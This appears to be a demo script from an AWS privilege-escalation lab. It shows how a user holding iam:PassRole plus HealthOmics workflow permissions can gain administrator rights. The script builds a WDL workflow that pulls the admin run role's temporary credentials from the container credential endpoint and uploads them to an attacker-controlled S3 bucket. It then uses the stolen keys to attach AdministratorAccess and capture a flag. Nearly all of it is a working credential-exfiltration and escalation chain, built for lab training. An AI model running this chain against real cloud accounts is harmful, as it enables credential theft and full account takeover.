#!/bin/bash
set -e

# Demo script for iam:PassRole + omics:CreateWorkflow + omics:StartRun privilege escalation
# This scenario demonstrates how a user with PassRole, CreateWorkflow, and StartRun can escalate
# by creating a HealthOmics WDL workflow that runs with an admin role, exfiltrates the role's
# temporary credentials to S3, and then uses those credentials to attach AdministratorAccess
# to the starting user.
#
# Prerequisites: Docker must be installed and running (used to seed ECR with the aws-cli image)

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-omics-001-to-admin-starting-user"
ADMIN_ROLE_NAME="pl-prod-omics-001-to-admin-admin-role"
WORKFLOW_NAME="pl-prod-omics-001-to-admin-workflow"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PassRole + HealthOmics CreateWorkflow + StartRun Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_omics_001_iam_passrole_omics_createworkflow_omics_startrun.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
ADMIN_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.admin_role_arn')
S3_BUCKET_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.attacker_bucket_name')
ECR_IMAGE_URI=$(echo "$MODULE_OUTPUT" | jq -r '.ecr_image_uri')
ECR_REGISTRY=$(echo "$MODULE_OUTPUT" | jq -r '.ecr_registry')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

if [ "$ECR_IMAGE_URI" == "null" ] || [ -z "$ECR_IMAGE_URI" ]; then
    echo -e "${RED}Error: Could not extract ecr_image_uri from terraform output${NC}"
    echo "Re-run 'terraform apply' to deploy the ECR resources."
    exit 1
fi

# Retrieve readonly credentials for observation steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Determine ECR push credentials: attacker account if available, otherwise admin
ATTACKER_ACCESS_KEY=$(terraform output -raw attacker_admin_user_access_key_id 2>/dev/null)
ATTACKER_SECRET_KEY=$(terraform output -raw attacker_admin_user_secret_access_key 2>/dev/null)

if [ -n "$ATTACKER_ACCESS_KEY" ] && [ "$ATTACKER_ACCESS_KEY" != "null" ]; then
    ECR_PUSH_ACCESS_KEY="$ATTACKER_ACCESS_KEY"
    ECR_PUSH_SECRET_KEY="$ATTACKER_SECRET_KEY"
    ECR_PUSH_IDENTITY="attacker"
else
    ECR_PUSH_ACCESS_KEY=$(terraform output -raw prod_admin_user_for_cleanup_access_key_id 2>/dev/null)
    ECR_PUSH_SECRET_KEY=$(terraform output -raw prod_admin_user_for_cleanup_secret_access_key 2>/dev/null)
    ECR_PUSH_IDENTITY="admin"
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "ECR push credentials: ${ECR_PUSH_IDENTITY} account"
echo "Admin Role ARN: $ADMIN_ROLE_ARN"
echo "S3 Bucket (attacker exfil): $S3_BUCKET_NAME"
echo "ECR Image URI: $ECR_IMAGE_URI"
echo "ECR Registry: $ECR_REGISTRY"
echo "Region: $AWS_REGION"
echo -e "${GREEN}Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}
use_ecr_push_creds() {
    export AWS_ACCESS_KEY_ID="$ECR_PUSH_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$ECR_PUSH_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Verifying starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}Verified starting user identity${NC}\n"

# Step 3: Get account ID (using readonly creds)
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}Retrieved account ID${NC}\n"

# Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
use_starting_creds
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 5: Ensure the aws-cli container image is available in private ECR
echo -e "${YELLOW}Step 5: Ensuring workflow container image is available in ECR${NC}"
echo "HealthOmics requires private ECR image URIs. Checking if image is cached..."
echo -e "${BLUE}Prerequisite: Docker is required to seed the ECR image on first run.${NC}"

# Extract repo name from the full URI (everything after the first /)
ECR_REPO_NAME=$(echo "$ECR_IMAGE_URI" | sed 's|[^/]*/||; s|:.*||')

use_ecr_push_creds
if aws ecr describe-images \
    --registry-id "$(echo "$ECR_REGISTRY" | cut -d. -f1)" \
    --repository-name "$ECR_REPO_NAME" \
    --image-ids imageTag=latest \
    --region "$AWS_REGION" >/dev/null 2>&1; then
    echo -e "${GREEN}Container image already available in ECR${NC}\n"
else
    echo "Image not yet in ECR. Using Docker to pull from public ECR and push..."
    echo "(This is infrastructure setup, not part of the attack - using ${ECR_PUSH_IDENTITY} credentials)"
    echo ""

    # 5a: Check Docker prerequisite
    if ! command -v docker &> /dev/null; then
        echo -e "${RED}Error: Docker is not installed or not in PATH${NC}"
        echo "Docker is required to pull the public aws-cli image and push it to ECR."
        echo "Install Docker: https://docs.docker.com/get-docker/"
        exit 1
    fi

    if ! docker info &> /dev/null; then
        echo -e "${RED}Error: Docker daemon is not running${NC}"
        echo "Start Docker and try again."
        exit 1
    fi
    echo -e "${GREEN}Docker is available${NC}"

    # 5b: Docker login to ECR using push creds
    echo ""
    echo "Logging into ECR registry..."
    use_ecr_push_creds
    show_cmd "${ECR_PUSH_IDENTITY^}" "aws ecr get-login-password --region $AWS_REGION | docker login --username AWS --password-stdin $ECR_REGISTRY"
    aws ecr get-login-password --region "$AWS_REGION" | \
        docker login --username AWS --password-stdin "$ECR_REGISTRY" 2>&1

    if [ $? -ne 0 ]; then
        echo -e "${RED}Error: Failed to login to ECR${NC}"
        exit 1
    fi
    echo -e "${GREEN}Logged into ECR${NC}"

    # 5c: Pull public aws-cli image (force amd64 -- HealthOmics requires x86_64)
    echo ""
    echo "Pulling public aws-cli image (amd64 -- HealthOmics requires x86_64)..."
    show_cmd "${ECR_PUSH_IDENTITY^}" "docker pull --platform linux/amd64 public.ecr.aws/aws-cli/aws-cli:latest"
    docker pull --platform linux/amd64 public.ecr.aws/aws-cli/aws-cli:latest 2>&1

    if [ $? -ne 0 ]; then
        echo -e "${RED}Error: Failed to pull public aws-cli image${NC}"
        exit 1
    fi
    echo -e "${GREEN}Pulled aws-cli image (amd64)${NC}"

    # 5d: Tag and push to ECR
    echo ""
    echo "Tagging and pushing to ECR..."
    show_cmd "${ECR_PUSH_IDENTITY^}" "docker tag public.ecr.aws/aws-cli/aws-cli:latest $ECR_IMAGE_URI"
    docker tag public.ecr.aws/aws-cli/aws-cli:latest "$ECR_IMAGE_URI"

    show_cmd "${ECR_PUSH_IDENTITY^}" "docker push $ECR_IMAGE_URI"
    docker push "$ECR_IMAGE_URI" 2>&1

    if [ $? -ne 0 ]; then
        echo -e "${RED}Error: Failed to push image to ECR${NC}"
        exit 1
    fi
    echo -e "${GREEN}Image pushed to ECR: $ECR_IMAGE_URI${NC}\n"
fi

# Step 6: Create malicious WDL workflow definition
echo -e "${YELLOW}Step 6: Creating malicious WDL workflow definition${NC}"
echo "HealthOmics workflow tasks have network isolation - they cannot call IAM APIs directly."
echo "Instead, the exploit exfiltrates the admin run role's temporary credentials"
echo "to S3 (which IS accessible from within HealthOmics tasks), then the attacker"
echo "retrieves them and uses them locally."
echo ""
echo -e "${BLUE}Attack Simulation Note:${NC}"
echo -e "${BLUE}  The exfiltration S3 bucket is attacker-controlled. The bucket policy grants${NC}"
echo -e "${BLUE}  the prod account read/write access (via resource policy). If an attacker${NC}"
echo -e "${BLUE}  account is configured, this bucket lives in a separate AWS account.${NC}"
echo ""
echo "Note: The victim environment has the aws-cli image in private ECR for HealthOmics."
echo "Using image: $ECR_IMAGE_URI"

mkdir -p /tmp/omics-workflow

cat > /tmp/omics-workflow/main.wdl << 'WDLEOF'
version 1.0

workflow ExfiltrateCredentials {
  input {
    String s3_bucket
    String s3_key
  }
  call ExfilTask {
    input:
      s3_bucket = s3_bucket,
      s3_key = s3_key
  }
  output {
    String result = ExfilTask.result
  }
}

task ExfilTask {
  input {
    String s3_bucket
    String s3_key
  }
  command <<<
    # HealthOmics injects credentials via the container credential provider.
    # The aws-cli image has the AWS CLI pre-installed, so we can use it directly
    # to extract the run role's temporary credentials and upload them to S3.

    # Capture the run role's temporary credentials from the credential provider
    CREDS_JSON=$(aws sts get-session-token --output json 2>/dev/null || true)

    # If get-session-token fails (common with assumed role creds), fall back to
    # capturing the credentials directly from the environment/credential provider
    if [ -z "$CREDS_JSON" ] || echo "$CREDS_JSON" | grep -q "error"; then
      # Use the caller identity to confirm we have creds, then extract them
      # from the container credential provider endpoint
      CALLER=$(aws sts get-caller-identity --output json)
      echo "Running as: $(echo $CALLER | grep -o '"Arn":"[^"]*"')"

      # The AWS CLI resolves credentials internally; extract them via env dump
      # HealthOmics provides creds via AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
      if [ -n "$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" ]; then
        CRED_RESPONSE=$(curl -s "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI")
        echo "$CRED_RESPONSE" | python3 -c "
import sys, json
d = json.load(sys.stdin)
print(json.dumps({'AccessKeyId': d['AccessKeyId'], 'SecretAccessKey': d['SecretAccessKey'], 'SessionToken': d['Token']}))
" > /tmp/creds.json
      else
        # Fall back to environment variables
        python3 -c "
import os, json
print(json.dumps({'AccessKeyId': os.environ.get('AWS_ACCESS_KEY_ID',''), 'SecretAccessKey': os.environ.get('AWS_SECRET_ACCESS_KEY',''), 'SessionToken': os.environ.get('AWS_SESSION_TOKEN','')}))
" > /tmp/creds.json
      fi
    fi

    # Upload the exfiltrated credentials to S3
    aws s3 cp /tmp/creds.json "s3://~{s3_bucket}/~{s3_key}"
    echo "Credentials exfiltrated to s3://~{s3_bucket}/~{s3_key}"
  >>>
  runtime {
    docker: "PLACEHOLDER_ECR_IMAGE_URI"
    memory: "2 GiB"
    cpu: 1
  }
  output {
    String result = "done"
  }
}
WDLEOF

# HealthOmics requires private ECR image URIs -- substitute the actual ECR URI
sed -i.bak "s|PLACEHOLDER_ECR_IMAGE_URI|${ECR_IMAGE_URI}|g" /tmp/omics-workflow/main.wdl
rm -f /tmp/omics-workflow/main.wdl.bak

echo -e "${GREEN}WDL workflow definition created at /tmp/omics-workflow/main.wdl${NC}\n"

# Step 7: Package WDL into a zip and create the workflow
echo -e "${YELLOW}Step 7: Packaging and creating HealthOmics workflow${NC}"
echo "Workflow name: $WORKFLOW_NAME"

# Package the WDL file into a zip
cd /tmp/omics-workflow
zip -j /tmp/omics-workflow.zip main.wdl > /dev/null 2>&1
cd - > /dev/null

use_starting_creds
show_attack_cmd "Attacker" "aws omics create-workflow --region $AWS_REGION --name $WORKFLOW_NAME --definition-zip fileb:///tmp/omics-workflow.zip --engine WDL --parameter-template '{\"s3_bucket\":{\"description\":\"S3 bucket for credential exfiltration\"},\"s3_key\":{\"description\":\"S3 key for credential output\"}}' --output json"
WORKFLOW_RESULT=$(aws omics create-workflow \
    --region $AWS_REGION \
    --name "$WORKFLOW_NAME" \
    --definition-zip "fileb:///tmp/omics-workflow.zip" \
    --engine WDL \
    --parameter-template '{"s3_bucket":{"description":"S3 bucket for credential exfiltration"},"s3_key":{"description":"S3 key for credential output"}}' \
    --output json)

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to create HealthOmics workflow${NC}"
    rm -rf /tmp/omics-workflow /tmp/omics-workflow.zip
    exit 1
fi

WORKFLOW_ID=$(echo "$WORKFLOW_RESULT" | jq -r '.id')
echo "Workflow ID: $WORKFLOW_ID"
echo -e "${GREEN}HealthOmics workflow created${NC}\n"

# [OBSERVATION]
# Step 8: Wait for workflow to reach ACTIVE state
echo -e "${YELLOW}Step 8: Waiting for workflow to become ACTIVE${NC}"
echo "Polling workflow state..."

use_readonly_creds
MAX_WAIT=300
ELAPSED=0
while [ $ELAPSED -lt $MAX_WAIT ]; do
    show_cmd "ReadOnly" "aws omics get-workflow --region $AWS_REGION --id $WORKFLOW_ID --query 'status' --output text"
    WORKFLOW_STATE=$(aws omics get-workflow \
        --region $AWS_REGION \
        --id "$WORKFLOW_ID" \
        --query 'status' \
        --output text)

    echo "Workflow state: $WORKFLOW_STATE"

    if [ "$WORKFLOW_STATE" == "ACTIVE" ]; then
        echo -e "${GREEN}Workflow is ACTIVE${NC}\n"
        break
    fi

    if [ "$WORKFLOW_STATE" == "FAILED" ] || [ "$WORKFLOW_STATE" == "DELETED" ] || [ "$WORKFLOW_STATE" == "INACTIVE" ]; then
        echo -e "${RED}Error: Workflow entered unexpected state: $WORKFLOW_STATE${NC}"
        # Try to get error details
        WORKFLOW_DETAILS=$(aws omics get-workflow \
            --region $AWS_REGION \
            --id "$WORKFLOW_ID" \
            --query 'statusMessage' \
            --output text 2>/dev/null)
        if [ -n "$WORKFLOW_DETAILS" ] && [ "$WORKFLOW_DETAILS" != "None" ]; then
            echo "Details: $WORKFLOW_DETAILS"
        fi
        rm -rf /tmp/omics-workflow /tmp/omics-workflow.zip
        exit 1
    fi

    sleep 15
    ELAPSED=$((ELAPSED + 15))
done

if [ $ELAPSED -ge $MAX_WAIT ]; then
    echo -e "${RED}Error: Timed out waiting for workflow to become ACTIVE${NC}"
    rm -rf /tmp/omics-workflow /tmp/omics-workflow.zip
    exit 1
fi

# Step 9: Start workflow run with admin role (the privilege escalation)
echo -e "${YELLOW}Step 9: Starting workflow run with admin role${NC}"
echo "This is the privilege escalation vector - passing the admin role as the run role..."
echo "Admin Role ARN: $ADMIN_ROLE_ARN"
echo "Credential exfil target: s3://$S3_BUCKET_NAME/exfil/creds.json"

EXFIL_KEY="exfil/creds.json"

use_starting_creds
show_attack_cmd "Attacker" "aws omics start-run --region $AWS_REGION --workflow-id $WORKFLOW_ID --role-arn $ADMIN_ROLE_ARN --output-uri s3://$S3_BUCKET_NAME/output/ --parameters '{\"s3_bucket\":\"$S3_BUCKET_NAME\",\"s3_key\":\"$EXFIL_KEY\"}' --output json"
RUN_RESULT=$(aws omics start-run \
    --region $AWS_REGION \
    --workflow-id "$WORKFLOW_ID" \
    --role-arn "$ADMIN_ROLE_ARN" \
    --output-uri "s3://$S3_BUCKET_NAME/output/" \
    --parameters '{"s3_bucket":"'"$S3_BUCKET_NAME"'","s3_key":"'"$EXFIL_KEY"'"}' \
    --output json)

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to start workflow run${NC}"
    rm -rf /tmp/omics-workflow /tmp/omics-workflow.zip
    exit 1
fi

RUN_ID=$(echo "$RUN_RESULT" | jq -r '.id')
echo "Run ID: $RUN_ID"
echo -e "${GREEN}Workflow run started${NC}\n"

# [OBSERVATION]
# Step 10: Poll run status until completion
echo -e "${YELLOW}Step 10: Waiting for workflow run to complete${NC}"
echo "Polling run status every 30 seconds (15 minute timeout)..."

use_readonly_creds
MAX_WAIT=900
ELAPSED=0
while [ $ELAPSED -lt $MAX_WAIT ]; do
    show_cmd "ReadOnly" "aws omics get-run --region $AWS_REGION --id $RUN_ID --query 'status' --output text"
    RUN_STATE=$(aws omics get-run \
        --region $AWS_REGION \
        --id "$RUN_ID" \
        --query 'status' \
        --output text)

    echo "[$((ELAPSED / 60))m $((ELAPSED % 60))s] Run state: $RUN_STATE"

    if [ "$RUN_STATE" == "COMPLETED" ]; then
        echo -e "${GREEN}Workflow run completed successfully!${NC}\n"
        break
    fi

    if [ "$RUN_STATE" == "FAILED" ] || [ "$RUN_STATE" == "CANCELLED" ]; then
        echo -e "${RED}Error: Workflow run entered state: $RUN_STATE${NC}"
        # Attempt to get error details
        RUN_DETAILS=$(aws omics get-run \
            --region $AWS_REGION \
            --id "$RUN_ID" \
            --query 'statusMessage' \
            --output text 2>/dev/null)
        if [ -n "$RUN_DETAILS" ] && [ "$RUN_DETAILS" != "None" ]; then
            echo "Details: $RUN_DETAILS"
        fi
        rm -rf /tmp/omics-workflow /tmp/omics-workflow.zip
        exit 1
    fi

    sleep 30
    ELAPSED=$((ELAPSED + 30))
done

if [ $ELAPSED -ge $MAX_WAIT ]; then
    echo -e "${RED}Error: Timed out waiting for workflow run to complete (15 minutes)${NC}"
    echo "Run may still be in progress. Check the HealthOmics console."
    rm -rf /tmp/omics-workflow /tmp/omics-workflow.zip
    exit 1
fi

# Step 11: Retrieve exfiltrated admin credentials from S3
echo -e "${YELLOW}Step 11: Retrieving exfiltrated admin credentials from S3${NC}"
echo "The WDL workflow task extracted the admin run role's temporary credentials"
echo "and wrote them to s3://$S3_BUCKET_NAME/$EXFIL_KEY"

use_readonly_creds
show_cmd "ReadOnly" "aws s3 cp s3://$S3_BUCKET_NAME/$EXFIL_KEY /tmp/stolen_creds.json --region $AWS_REGION"
aws s3 cp "s3://$S3_BUCKET_NAME/$EXFIL_KEY" /tmp/stolen_creds.json \
    --region $AWS_REGION

if [ ! -f /tmp/stolen_creds.json ]; then
    echo -e "${RED}Error: Could not retrieve exfiltrated credentials${NC}"
    rm -rf /tmp/omics-workflow /tmp/omics-workflow.zip
    exit 1
fi

STOLEN_ACCESS_KEY=$(jq -r '.AccessKeyId' /tmp/stolen_creds.json)
STOLEN_SECRET_KEY=$(jq -r '.SecretAccessKey' /tmp/stolen_creds.json)
STOLEN_SESSION_TOKEN=$(jq -r '.SessionToken' /tmp/stolen_creds.json)

echo "Stolen Access Key ID: ${STOLEN_ACCESS_KEY:0:10}..."
echo -e "${GREEN}Retrieved admin role credentials from S3${NC}\n"

# Step 12: Use stolen admin credentials to attach AdministratorAccess
echo -e "${YELLOW}Step 12: Using stolen admin credentials to escalate privileges${NC}"
echo "Switching to the exfiltrated admin role credentials to call IAM..."

# Temporarily use the stolen admin credentials
export AWS_ACCESS_KEY_ID="$STOLEN_ACCESS_KEY"
export AWS_SECRET_ACCESS_KEY="$STOLEN_SECRET_KEY"
export AWS_SESSION_TOKEN="$STOLEN_SESSION_TOKEN"
# Keep region consistent
export AWS_REGION=$AWS_REGION

# Verify we're now the admin role
show_cmd "StolenAdmin" "aws sts get-caller-identity"
STOLEN_IDENTITY=$(aws sts get-caller-identity --output json 2>&1)
echo "$STOLEN_IDENTITY" | jq '.' 2>/dev/null || echo "$STOLEN_IDENTITY"
echo ""

# Attach AdministratorAccess to the starting user
echo "Attaching AdministratorAccess to $STARTING_USER..."
show_attack_cmd "StolenAdmin" "aws iam attach-user-policy --user-name $STARTING_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
aws iam attach-user-policy \
    --user-name "$STARTING_USER" \
    --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"

if [ $? -eq 0 ]; then
    echo -e "${GREEN}AdministratorAccess attached to $STARTING_USER!${NC}"
else
    echo -e "${RED}Error: Failed to attach AdministratorAccess${NC}"
    rm -rf /tmp/omics-workflow /tmp/omics-workflow.zip /tmp/stolen_creds.json
    exit 1
fi
echo ""

# Step 13: Verify privilege escalation
echo -e "${YELLOW}Step 13: Verifying privilege escalation${NC}"
echo "Waiting 15 seconds for IAM policy to propagate..."
sleep 15

# Use readonly creds to confirm the policy attachment via IAM read
use_readonly_creds
# Keep region consistent
export AWS_REGION=$AWS_REGION

show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name $STARTING_USER --output table"
ATTACHED_POLICIES=$(aws iam list-attached-user-policies \
    --user-name "$STARTING_USER" \
    --output json)

ADMIN_ATTACHED=$(echo "$ATTACHED_POLICIES" | jq -r '.AttachedPolicies[] | select(.PolicyArn == "arn:aws:iam::aws:policy/AdministratorAccess") | .PolicyName')

if [ -n "$ADMIN_ATTACHED" ]; then
    echo -e "${GREEN}AdministratorAccess policy confirmed on $STARTING_USER${NC}"
else
    echo -e "${RED}AdministratorAccess not found on user${NC}"
    rm -rf /tmp/omics-workflow /tmp/omics-workflow.zip /tmp/stolen_creds.json
    exit 1
fi
echo ""

# Switch to starting user credentials to confirm their new admin access works
use_starting_creds
export AWS_REGION=$AWS_REGION
echo "Verifying starting user can now list IAM users (proves admin escalation worked)..."
show_cmd "Attacker (now admin)" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}Successfully listed IAM users as starting user!${NC}"
    echo -e "${GREEN}ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}Failed to list users as starting user${NC}"
    rm -rf /tmp/omics-workflow /tmp/omics-workflow.zip /tmp/stolen_creds.json
    exit 1
fi
echo ""

# Clean up temporary files
rm -rf /tmp/omics-workflow /tmp/omics-workflow.zip /tmp/stolen_creds.json

# [EXPLOIT]
# Step 14: Capture the CTF flag
# The starting user now has AdministratorAccess attached (via the stolen admin role
# credentials used in step 12). Switch back to starting user creds and read the flag.
use_starting_creds
export AWS_REGION=$AWS_REGION
echo -e "${YELLOW}Step 14: Capturing CTF flag from SSM Parameter Store${NC}"
FLAG_PARAM_NAME="/pathfinding-labs/flags/omics-001-to-admin"
show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
FLAG_VALUE=$(aws ssm get-parameter --region "$AWS_REGION" --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)

if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
    echo -e "${GREEN}Flag captured: ${FLAG_VALUE}${NC}"
else
    echo -e "${RED}Failed to read flag from $FLAG_PARAM_NAME${NC}"
    exit 1
fi
echo ""

# Restore helpful permissions for manual exploration
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with iam:PassRole, omics:CreateWorkflow, omics:StartRun)"
echo "2. Created malicious WDL workflow definition to exfiltrate credentials"
echo "3. Created HealthOmics workflow from the WDL definition"
echo "4. Started workflow run passing admin role ($ADMIN_ROLE_NAME) via iam:PassRole"
echo "5. Workflow task exfiltrated admin role credentials to S3 (HealthOmics cannot call IAM directly)"
echo "6. Retrieved stolen credentials and used them to attach AdministratorAccess to $STARTING_USER"
echo "7. Achieved: Administrator Access"
echo "8. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER -> (omics:CreateWorkflow) -> WDL workflow"
echo "  -> (iam:PassRole + omics:StartRun with $ADMIN_ROLE_NAME)"
echo "  -> Workflow task exfiltrates admin creds to S3"
echo "  -> Attacker retrieves creds -> (iam:AttachUserPolicy) -> Admin"
echo "  -> (ssm:GetParameter) -> CTF Flag"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- HealthOmics Workflow: $WORKFLOW_NAME (ID: $WORKFLOW_ID)"
echo "- Workflow Run ID: $RUN_ID"
echo "- S3 exfiltrated credentials: s3://$S3_BUCKET_NAME/$EXFIL_KEY"
echo "- AdministratorAccess policy attached to $STARTING_USER"

echo -e "\n${RED}Warning: The HealthOmics workflow is still deployed${NC}"
echo -e "${RED}AdministratorAccess is still attached to $STARTING_USER${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
